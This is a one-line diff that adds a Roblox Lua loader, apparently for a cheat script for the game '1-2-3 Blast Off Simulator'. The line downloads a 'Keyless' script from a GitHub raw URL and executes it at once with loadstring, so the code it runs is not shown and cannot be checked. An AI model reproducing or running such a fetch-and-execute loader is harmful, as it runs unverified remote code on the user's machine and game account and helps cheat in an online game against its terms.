@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kaksakan/1-2-3-Blast-Off-Simulator/main/Main/Script/Keyless/2024.lua"))()
